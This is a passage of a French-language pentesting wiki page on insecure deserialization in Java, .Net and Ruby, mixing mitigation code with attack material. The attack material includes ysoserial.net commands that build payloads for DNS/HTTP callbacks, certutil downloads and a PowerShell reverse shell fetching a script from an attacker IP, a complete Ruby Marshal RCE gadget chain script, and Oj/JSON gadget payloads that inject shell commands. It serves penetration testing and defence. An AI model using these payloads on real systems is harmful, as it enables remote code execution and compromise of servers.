private transient double margin; // declared transient
```
#### Éviter la sérialisation d'une classe qui doit implémenter Serializable

Dans des scénarios où certains **objets doivent implémenter l'interface `Serializable`** en raison de la hiérarchie de classes, il existe un risque de désérialisation involontaire. Pour l'empêcher, assurez-vous que ces objets ne peuvent pas être désérialisés en définissant une méthode `final` `readObject()` qui lance systématiquement une exception, comme montré ci-dessous :
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Renforcer la sécurité de la désérialisation en Java**

**Personnaliser `java.io.ObjectInputStream`** est une approche pratique pour sécuriser les processus de désérialisation. Cette méthode convient lorsque :

- Le code de désérialisation est sous votre contrôle.
- Les classes attendues pour la désérialisation sont connues.

Redéfinissez la méthode **`resolveClass()`** pour limiter la désérialisation uniquement aux classes autorisées. Cela empêche la désérialisation de toute classe à l'exception de celles explicitement autorisées, comme dans l'exemple suivant qui restreint la désérialisation à la classe `Bicycle` uniquement :
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Using a Java Agent for Security Enhancement** offre une solution de repli lorsque la modification du code n'est pas possible. Cette méthode s'applique principalement pour **blacklisting harmful classes**, en utilisant un paramètre JVM:
```
-javaagent:name-of-agent.jar
```
Il fournit un moyen de sécuriser la désérialisation de manière dynamique, idéal pour les environnements où des modifications de code immédiates sont impraticables.

Check and example in [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implémentation des filtres de sérialisation**: Java 9 a introduit des filtres de sérialisation via l'interface **`ObjectInputFilter`**, offrant un mécanisme puissant pour spécifier les critères que les objets sérialisés doivent satisfaire avant d'être désérialisés. Ces filtres peuvent être appliqués globalement ou par flux, offrant un contrôle granulaire du processus de désérialisation.

Pour utiliser les filtres de sérialisation, vous pouvez définir un filtre global qui s'applique à toutes les opérations de désérialisation ou le configurer dynamiquement pour des flux spécifiques. Par exemple:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Utiliser des bibliothèques externes pour renforcer la sécurité**: Libraries such as **NotSoSerial**, **jdeserialize**, and **Kryo** offer advanced features for controlling and monitoring Java deserialization. Ces bibliothèques peuvent apporter des couches de sécurité supplémentaires, telles que le whitelisting ou le blacklisting de classes, l'analyse d'objets sérialisés avant désérialisation, et l'implémentation de stratégies de sérialisation personnalisées.

- **NotSoSerial** intercepte les processus de désérialisation pour empêcher l'exécution de code non fiable.
- **jdeserialize** permet l'analyse d'objets Java sérialisés sans les désérialiser, aidant à identifier un contenu potentiellement malveillant.
- **Kryo** est un framework de sérialisation alternatif axé sur la rapidité et l'efficacité, offrant des stratégies de sérialisation configurables pouvant améliorer la sécurité.

### Références

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- Deserialization and ysoserial talk: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Talk about gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) and slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec paper: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Trouvez ce qu'est **JNDI Injection**, comment l'abuser via RMI, CORBA & LDAP et comment exploiter **log4shell** (et un exemple de cette vulnérabilité) dans la page suivante:


{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Java Message Service

> L'API **Java Message Service** (**JMS**) est une API middleware orientée messages pour envoyer des messages entre deux clients ou plus. Elle constitue une implémentation pour gérer le problème producteur–consommateur. JMS fait partie de la Java Platform, Enterprise Edition (Java EE), et a été définie par une spécification développée chez Sun Microsystems, mais qui est depuis encadrée par la Java Community Process. C'est une norme de messagerie qui permet aux composants d'application basés sur Java EE de créer, envoyer, recevoir et lire des messages. Elle permet la communication entre différents composants d'une application distribuée de manière faiblement couplée, fiable et asynchrone. (From [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)).

### Products

There are several products using this middleware to send messages:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### Exploitation

En pratique, de nombreux services utilisent JMS de manière dangereuse. Par conséquent, si vous disposez de suffisamment de privilèges pour envoyer des messages à ces services (généralement vous aurez besoin d'identifiants valides), vous pourriez être en mesure d'envoyer des objets sérialisés malveillants qui seront désérialisés par le consumer/subscriber.\
Cela signifie que, dans cette exploitation, tous les clients qui vont utiliser ce message seront compromis.

Il faut garder à l'esprit que même si un service est vulnérable (parce qu'il désérialise de manière non sécurisée des entrées utilisateur), vous devez quand même trouver des gadgets valides pour exploiter la vulnérabilité.

L'outil [JMET](https://github.com/matthiaskaiser/jmet) a été créé pour **se connecter et attaquer ces services en envoyant plusieurs objets sérialisés malveillants utilisant des gadgets connus**. Ces exploits fonctionneront si le service est toujours vulnérable et si l'un des gadgets utilisés se trouve dans l'application vulnérable.

### References

- [Patchstack advisory – Everest Forms unauthenticated PHP Object Injection (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)

- JMET talk: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

Dans le contexte de .Net, les exploits de désérialisation opèrent de manière analogue à ceux rencontrés en Java, où des gadgets sont exploités pour exécuter du code spécifique lors de la désérialisation d'un objet.

### Fingerprint

#### WhiteBox

Le code source doit être inspecté à la recherche des occurrences de :

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

L'attention doit se porter sur les serializers qui permettent que le type soit déterminé par une variable sous le contrôle de l'utilisateur.

#### BlackBox

La recherche doit cibler la chaîne encodée Base64 **AAEAAAD/////** ou tout motif similaire susceptible d'être désérialisé côté serveur, accordant le contrôle du type à désérialiser. Cela peut inclure, sans s'y limiter, des structures **JSON** ou **XML** présentant `TypeObject` ou `$type`.

### ysoserial.net

Dans ce cas, vous pouvez utiliser l'outil [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) afin de **créer les exploits de désérialisation**. Une fois le dépôt git téléchargé, vous devez **compiler l'outil** en utilisant Visual Studio par exemple.

Si vous voulez comprendre **comment ysoserial.net crée son exploit** vous pouvez [**check this page where is explained the ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Les options principales de **ysoserial.net** sont : **`--gadget`**, **`--formatter`**, **`--output`** et **`--plugin`.**

- **`--gadget`** utilisé pour indiquer le gadget à exploiter (indiquer la classe/fonction qui sera abusée lors de la désérialisation pour exécuter des commandes).
- **`--formatter`**, utilisé pour indiquer la méthode pour sérialiser l'exploit (vous devez savoir quelle bibliothèque est utilisée par le back-end pour désérialiser la payload et utiliser la même pour la sérialiser).
- **`--output`** utilisé pour indiquer si vous voulez l'exploit en **raw** ou encodé en **base64**. _Notez que **ysoserial.net** va **encoder** la payload en **UTF-16LE** (encodage utilisé par défaut sous Windows) donc si vous récupérez la version brute et l'encodez depuis une console Linux vous pourriez rencontrer des problèmes de compatibilité d'encodage qui empêcheront l'exploit de fonctionner correctement (dans une machine HTB JSON la payload a fonctionné en UTF-16LE et en ASCII mais cela ne signifie pas que cela fonctionnera toujours)._
- **`--plugin`** ysoserial.net supporte des plugins pour créer des **exploits pour des frameworks spécifiques** comme ViewState

#### More ysoserial.net parameters

- `--minify` fournira une **payload plus petite** (si possible)
- `--raf -f Json.Net -c "anything"` indiquera tous les gadgets pouvant être utilisés avec un formatter fourni (`Json.Net` dans ce cas)
- `--sf xml` vous pouvez **indiquer un gadget** (`-g`) et ysoserial.net recherchera des formatters contenant "xml" (insensible à la casse)

**Exemples ysoserial** pour créer des exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** possède également un **paramètre très intéressant** qui aide à mieux comprendre comment chaque exploit fonctionne : `--test`\
Si vous indiquez ce paramètre **ysoserial.net** va **essayer** l'**exploit localement,** afin que vous puissiez tester si votre payload fonctionnera correctement.\
Ce paramètre est utile car si vous examinez le code vous trouverez des extraits de code comme le suivant (extrait de [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Cela signifie que, pour tester l'exploit, le code appellera [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
Le code précédent est vulnérable à l'exploit créé. Donc, si vous trouvez quelque chose de similaire dans une application .Net, cela signifie probablement que cette application est vulnérable aussi.  
Par conséquent, le paramètre **`--test`** nous permet de comprendre **quels morceaux de code sont vulnérables** à l'exploit de deserialization que **ysoserial.net** peut créer.

### ViewState

Consultez [this POST about **how to try to exploit the \_\_ViewState parameter of .Net** ](exploiting-__viewstate-parameter.md)to **execute arbitrary code.** Si vous **connaissez déjà les secrets** utilisés par la machine victime, [**read this post to know to execute code**](exploiting-__viewstate-knowing-the-secret.md)**.**

### Prévention

Pour atténuer les risques associés à la deserialization dans .Net :

- **Évitez de permettre aux flux de données de définir leurs types d'objet.** Utilisez `DataContractSerializer` ou `XmlSerializer` lorsque cela est possible.
- **Pour `JSON.Net`, réglez `TypeNameHandling` sur `None` :** `TypeNameHandling = TypeNameHandling.None`
- **Évitez d'utiliser `JavaScriptSerializer` avec un `JavaScriptTypeResolver`.**
- **Limitez les types qui peuvent être désérialisés**, en comprenant les risques inhérents aux types .Net, tels que `System.IO.FileInfo`, qui peuvent modifier les propriétés des fichiers du serveur, pouvant mener à des attaques par déni de service.
- **Soyez prudent avec les types ayant des propriétés risquées**, comme `System.ComponentModel.DataAnnotations.ValidationException` avec sa propriété `Value`, qui peut être exploitée.
- **Contrôlez de manière sécurisée l'instanciation des types** pour empêcher les attaquants d'influencer le processus de désérialisation, rendant même `DataContractSerializer` ou `XmlSerializer` vulnérables.
- **Mettez en œuvre des contrôles de liste blanche** en utilisant un `SerializationBinder` personnalisé pour `BinaryFormatter` et `JSON.Net`.
- **Tenez-vous informé des gadgets de deserialization connus et non sécurisés** au sein de .Net et assurez-vous que les désérialiseurs n'instancient pas de tels types.
- **Isolez le code potentiellement risqué** du code ayant accès à Internet afin d'éviter d'exposer des gadgets connus, tels que `System.Windows.Data.ObjectDataProvider` dans les applications WPF, à des sources de données non fiables.

### **References**

- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

En Ruby, serialization est assurée par deux méthodes au sein de la bibliothèque **marshal**. La première méthode, connue sous le nom **dump**, est utilisée pour transformer un objet en un flux d'octets. Ce processus est appelé serialization. À l'inverse, la seconde méthode, **load**, est employée pour retransformer un flux d'octets en un objet, un processus appelé deserialization.

Pour sécuriser les objets sérialisés, **Ruby utilise HMAC (Hash-Based Message Authentication Code)**, garantissant l'intégrité et l'authenticité des données. La clé utilisée à cette fin est stockée dans l'un des emplacements suivants :

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X generic deserialization to RCE gadget chain (more info in** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Autre chaîne RCE pour exploiter Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Méthode Ruby .send()

Comme expliqué dans [**ce rapport de vulnérabilité**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), si une entrée utilisateur non assainie atteint la méthode `.send()` d'un objet ruby, cette méthode permet d'**invoquer n'importe quelle autre méthode** de l'objet avec n'importe quels paramètres.

Par exemple, appeler eval puis du code ruby en tant que second paramètre permettra d'exécuter du code arbitraire :
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
De plus, si un seul paramètre de **`.send()`** est contrôlé par un attaquant, comme mentionné dans le writeup précédent, il est possible d'appeler n'importe quelle méthode de l'objet qui **n'a pas besoin d'arguments** ou dont les arguments ont des **valeurs par défaut**.\
Pour cela, il est possible d'énumérer toutes les méthodes de l'objet afin de **trouver des méthodes intéressantes qui répondent à ces exigences**.
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Ruby class pollution

Voyez comment il est possible de [pollute a Ruby class and abuse it in here](ruby-class-pollution.md).

### Ruby _json pollution

When sending in a body some values not hashabled like an array they will be added into a new key called `_json`. However, It’s possible for an attacker to also set in the body a value called `_json` with the arbitrary values he wishes. Then, If the backend for example checks the veracity of a parameter but then also uses the `_json` parameter to perform some action, an authorisation bypass could be performed.

Pour plus d'informations, consultez la [Ruby _json pollution page](ruby-_json-pollution.md).

### Other libraries

Cette technique a été reprise [ **from this blog post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

There are other Ruby libraries that can be used to serialize objects and therefore that could be abused to gain RCE during an insecure deserialization. The following table shows some of these libraries and the method they called of the loaded library whenever it's unserialized (function to abuse to get RCE basically):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Bibliothèque</strong></td><td><strong>Données d'entrée</strong></td><td><strong>Méthode déclencheuse à l'intérieur de la classe</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binary</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (class needs to be put into hash(map) as key)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([see notes regarding json_create at end](#table-vulnerable-sinks))</td></tr></tbody></table>

Exemple basique :
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
Dans le cas d'une tentative d'abuser Oj, il a été possible de trouver un gadget class qui, dans sa fonction `hash`, appelle `to_s`, qui appelle spec, qui appelle fetch_path, et qu'on pouvait contraindre à récupérer une URL aléatoire, fournissant un excellent détecteur pour ce type d'unsanitized deserialization vulnerabilities.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
De plus, il a été constaté qu'avec la technique précédente, un dossier est créé sur le système, ce qui est nécessaire pour exploiter un autre gadget et transformer cela en un RCE complet, par exemple :
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Consultez le [**original post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared) pour plus de détails.

### Bootstrap Caching

Ce n'est pas vraiment une vulnérabilité de désérialisation mais une astuce intéressante pour abuser du bootstrap caching afin d'obtenir une RCE depuis une application rails via un arbitrary file write (trouvez le post original complet ici : https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/).

Ci‑dessous un court résumé des étapes détaillées dans l'article pour exploiter une vulnérabilité d'écriture de fichier arbitraire en abusant du cache Bootsnap :

- Identifier la vulnérabilité et l'environnement

  La fonctionnalité d'upload de fichiers de l'application Rails permet à un attaquant d'écrire des fichiers de manière arbitraire. Bien que l'application fonctionne avec des restrictions (seuls certains répertoires comme tmp sont inscriptibles à cause de l'utilisateur non-root de Docker), cela permet néanmoins d'écrire dans le répertoire de cache Bootsnap (généralement sous tmp/cache/bootsnap).

- Comprendre le mécanisme de cache de Bootsnap

  Bootsnap accélère le démarrage de Rails en mettant en cache du code Ruby compilé, des fichiers YAML et JSON. Il stocke des fichiers de cache qui incluent un en‑tête de cache key (avec des champs comme Ruby version, file size, mtime, compile options, etc.) suivi du code compilé. Cet en‑tête est utilisé pour valider le cache au démarrage de l'application.

- Collecter les métadonnées du fichier

  L'attaquant choisit d'abord un fichier cible susceptible d'être chargé au démarrage de Rails (par exemple, set.rb de la bibliothèque standard Ruby). En exécutant du code Ruby à l'intérieur du conteneur, il extrait des métadonnées critiques (comme RUBY_VERSION, RUBY_REVISION, size, mtime et compile_option). Ces informations sont essentielles pour fabriquer une cache key valide.

- Calculer le chemin du fichier de cache

  En reproduisant le mécanisme de hash FNV-1a 64-bit de Bootsnap, on détermine le chemin correct du fichier de cache. Cette étape garantit que le fichier de cache malveillant est placé exactement là où Bootsnap l'attend (par ex., sous tmp/cache/bootsnap/compile-cache-iseq/).

- Préparer le fichier de cache malveillant

  - Exécute des commandes arbitraires (par exemple, exécuter id pour afficher des infos sur le process).
  - Supprime le cache malveillant après exécution pour éviter une exploitation récursive.
  - Charge le fichier original (par ex., set.rb) pour éviter de planter l'application.

  Ce payload est compilé en code Ruby binaire et concaténé avec un en‑tête de cache key soigneusement construit (en utilisant les métadonnées collectées et le numéro de version correct pour Bootsnap).

- Écraser et déclencher l'exécution

  En exploitant la vulnérabilité d'écriture de fichier arbitraire, l'attaquant écrit le fichier de cache créé à l'emplacement calculé. Ensuite, il déclenche un redémarrage du serveur (en écrivant dans tmp/restart.txt, qui est surveillé par Puma). Lors du redémarrage, lorsque Rails require le fichier ciblé, le fichier de cache malveillant est chargé, entraînant une exécution de code à distance (RCE).



### Ruby Marshal exploitation in practice (mis à jour)

Considérez tout chemin par lequel des octets non fiables atteignent `Marshal.load`/`marshal_load` comme un sink RCE. Marshal reconstruit des graphes d'objets arbitraires et déclenche des callbacks de library/gem durant la matérialisation.


- Chemin de code Rails minimal vulnérable:
```ruby
class UserRestoreController < ApplicationController
def show
user_data = params[:data]
if user_data.present?
deserialized_user = Marshal.load(Base64.decode64(user_data))
render plain: "OK: #{deserialized_user.inspect}"
else
render plain: "No data", status: :bad_request
end
end
end
```
- Classes de gadget courantes observées dans des chains réelles : `Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`.
- Marqueur de side-effect typique intégré dans les payloads (exécuté pendant l'unmarshal) :
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```
Où cela apparaît dans des applications réelles :
- Les cache stores et session stores de Rails, historiquement basés sur Marshal
- Les backends de jobs en arrière-plan et les file-backed object stores
- Toute persistance personnalisée ou transport de blobs d'objets binaires

Découverte industrialisée de gadgets :
- Grep pour les constructeurs, `hash`, `_load`, `init_with`, ou les méthodes à effets de bord invoquées lors de l'unmarshal
- Utilisez les requêtes CodeQL Ruby unsafe deserialization pour tracer les sources → sinks et mettre au jour des gadgets
- Validez avec des PoCs publics multi-format (JSON/XML/YAML/Marshal)


## Références

- Trail of Bits – Marshal madness: A brief history of Ruby deserialization exploits: https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/
- elttam – Ruby 2.x Universal RCE Deserialization Gadget Chain: https://www.elttam.com/blog/ruby-deserialization/
- Phrack #69 – Rails 3/4 Marshal chain: https://phrack.org/issues/69/12.html
- CVE-2019-5420 (Rails 5.2 insecure deserialization): https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- ZDI – RCE via Ruby on Rails Active Storage insecure deserialization: https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
- Include Security – Discovering gadget chains in Rubyland: https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
- GitHub Security Lab – Ruby unsafe deserialization (query help): https://codeql.github.com/codeql-query-help/ruby/rb-unsafe-deserialization/
- GitHub Security Lab – PoCs repo: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization
- Doyensec PR – Ruby 3.4 gadget: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1
- Luke Jahnke – Ruby 3.4 universal chain: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Luke Jahnke – Gem::SafeMarshal escape: https://nastystereo.com/security/ruby-safe-marshal-escape.html
- Ruby 3.4.0-rc1 release: https://github.com/ruby/ruby/releases/tag/v3_4_0_rc1
- Ruby fix PR #12444: https://github.com/ruby/ruby/pull/12444
- Trail of Bits – Auditing RubyGems.org (Marshal findings): https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/
- watchTowr Labs – Is This Bad? This Feels Bad — GoAnywhere CVE-2025-10035: https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/

{{#include ../../banners/hacktricks-training.md}}
